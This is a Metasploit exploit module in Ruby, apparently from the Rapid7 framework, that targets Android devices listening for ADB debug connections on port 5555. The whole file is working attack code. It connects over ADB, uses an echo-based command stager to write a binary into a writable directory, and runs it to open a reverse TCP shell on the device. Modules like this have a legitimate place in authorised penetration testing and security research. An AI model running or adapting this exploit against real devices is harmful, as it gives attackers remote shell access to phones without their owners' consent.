##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/proto/adb/client'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Android ADB Debug Mode Shell Access',
      'Description'    => %q{
        Writes and spawns a native shell on an android device that is listening
        for adb debug messages.
      },
      'Author'         => ['joev'],
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'PAYLOAD' => 'linux/armle/reverse_tcp' },
      'Platform'       => 'linux',
      'Arch'           => ARCH_ALL,
      'Targets'        => [ ['Automatic', {}] ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jan 01 2016'
    ))

    register_options([
      Opt::RPORT(5555),
      OptString.new('WritableDir', [true, 'Writable directory', '/data/local/tmp/'])
    ], self.class)
  end

  def check
    begin
      connect
      device_info = adb_client.connect
      print_good "Detected device:\n#{device_info}"
      return Exploit::CheckCode::Vulnerable
    ensure
      disconnect
    end

    Exploit::CheckCode::Unknown
  end

  def execute_command(cmd, opts)
    response = adb_client.exec_cmd(cmd)
    print_good "Command executed, response:\n #{response}"
  end

  def exploit
    begin
      print_status "Connecting to device..."
      connect
      device_data = adb_client.connect
      print_good "Connected to device:\n#{device_data.data}"
      execute_cmdstager({
        :flavor => :echo,
        :enc_format => :octal,
        :prefix => '\\\\0',
        :temp => datastore['WritableDir']
      })
    ensure
      disconnect
    end
  end

  def adb_client
    @adb_client ||= Rex::Proto::ADB::Client.new(sock)
  end

end
